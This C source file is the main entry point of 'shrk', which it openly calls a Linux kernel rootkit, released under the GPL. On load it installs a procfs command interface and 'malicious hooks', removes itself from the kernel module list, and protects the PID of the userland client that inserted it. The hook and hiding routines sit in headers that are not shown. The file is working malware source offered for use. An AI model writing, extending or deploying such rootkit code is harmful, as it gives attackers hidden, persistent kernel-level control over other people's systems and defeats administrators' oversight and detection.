#include "inc/cmds.h"
#include "inc/hooks.h"
#include "inc/util.h"

// clang-format off

/*

 * shrk/kernel | kernel module for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

MODULE_LICENSE("GPL"); // required

// prevent no previous prototype warning
int  init(void);
void cleanup(void);

// https://lore.kernel.org/lkml/20230118105215.B9DA960514@lion.mk-sys.cz/T/
module_init(init);
module_exit(cleanup);

int init() {
  // setup procfs command interface
  if (!cmds_install()) {
    cleanup();
    return -1;
  }

  // install malicious hooks
  if (!hooks_install()) {
    cleanup();
    return -1;
  }

  // remove the module from the module list
  hideself();

  /*

   * unless we are running in debug mode
   * the userland client inserted us into the kernel
   * so lets protect it

  */
  if (!SHRK_DEBUG)
    protect_pid(current->pid);

  return 0;
}

void cleanup() {
  hooks_uninstall();
  cmds_uninstall();
}
